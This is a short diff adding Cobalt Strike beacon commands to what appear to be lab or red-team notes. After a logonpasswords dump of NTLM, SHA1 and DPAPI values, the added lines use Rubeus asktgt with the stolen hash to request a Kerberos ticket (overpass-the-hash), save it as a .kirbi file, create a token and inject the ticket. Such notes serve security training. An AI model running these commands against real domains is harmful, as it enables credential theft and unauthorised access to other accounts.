@@ -64,3 +64,12 @@ beacon> logonpasswords
         * NTLM     : f4da116176df371cafa28d8064de9c2e
         * SHA1     : c95c2b652c9e3fb2d4370638b4a8d083b9dd8759
 	    * DPAPI    : 8f92469378250718cb4da928ee6372e7
+    
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:etate /domain:DUBLIN /rc4:f4da116176df371cafa28d8064de9c2e /nowrap
+PS C:\Users\Attacker\Desktop> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\etate.kirbi", [Convert]::FromBase64String($ticket))
+
+beacon> make_token DUBLIN\etate FakePass
+...
+[04/28 21:49:51] [+] Impersonated DUBLIN\etate (netonly)
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\etate.kirbi
+beacon> run klist
